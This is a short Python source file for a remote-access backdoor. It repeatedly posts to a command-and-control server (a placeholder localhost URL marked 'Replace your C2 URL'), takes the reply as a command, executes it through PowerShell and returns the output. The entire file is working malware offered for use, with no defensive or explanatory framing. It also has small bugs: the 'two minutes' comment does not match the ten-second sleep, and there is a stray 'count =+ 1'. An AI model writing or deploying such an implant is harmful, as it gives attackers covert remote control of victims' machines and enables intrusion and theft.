import requests
import time
import subprocess


def http_sender(output):
    url = "http://localhost:8080"  # Replace your C2 URL 
    # This string will be sent to C2 to verify it's alive and return output of a command ran
    message_body = "ALIVE, Command Response: {}".format(output)
    
    try:
        response = requests.post(url, data=message_body)
        if response.status_code == 200:
            #print(f"Request sent successfully. Response: {response.text}")
            #saves the response which is the command in the command variable
            command = response.text 
        else:
            print(f"Request failed with status code: {response.status_code}")
    except Exception as e:
        print(f"An error occurred: {str(e)}")
        command = ''
    return command

def run_powershell_command(command):
    try:
        # Construct the PowerShell command using the '-Command' argument
        powershell_cmd = ['powershell.exe', '-Command', command]

        # Run the PowerShell command and capture the output
        output = subprocess.check_output(powershell_cmd, stderr=subprocess.STDOUT, shell=True, text=True)

        # Print the output
        print(output)
    except subprocess.CalledProcessError as e:
        print(f"Error executing PowerShell command: {e}")
    except Exception as ex:
        print(f"An error occurred: {ex}")

    return output

if __name__ == "__main__":
    output = 'No command Ran'
    while True:
        command_to_run = http_sender(output)
        if command_to_run:
            output = run_powershell_command(command_to_run) 
        # Sleep for 2 minutes (120 seconds) before sending the next request   
        time.sleep(10)  
        count =+ 1
        

